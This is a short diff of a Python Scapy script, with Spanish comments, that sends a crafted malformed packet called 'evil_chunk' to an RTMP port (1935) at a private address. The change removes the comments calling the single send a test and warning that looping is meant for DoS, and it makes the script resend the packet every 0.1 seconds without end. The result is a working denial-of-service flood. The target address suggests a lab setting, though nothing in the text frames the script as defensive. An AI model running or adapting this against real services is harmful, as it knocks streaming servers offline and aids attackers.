@@ -11,9 +11,6 @@ evil_chunk = (
     b"\x00" * 1000       # Datos adicionales (basura)
 )
 
-# Enviar una vez (para pruebas)
 pkt = IP(dst="172.18.0.2") / TCP(dport=1935, flags="PA") / Raw(load=evil_chunk)
-send(pkt, verbose=1)
+send(pkt, verbose=1, loop=1, inter=0.1)
 
-# Opcional: Envío en bucle (para DoS, usar con precaución)
-# send(pkt, loop=1, inter=0.1, verbose=0)
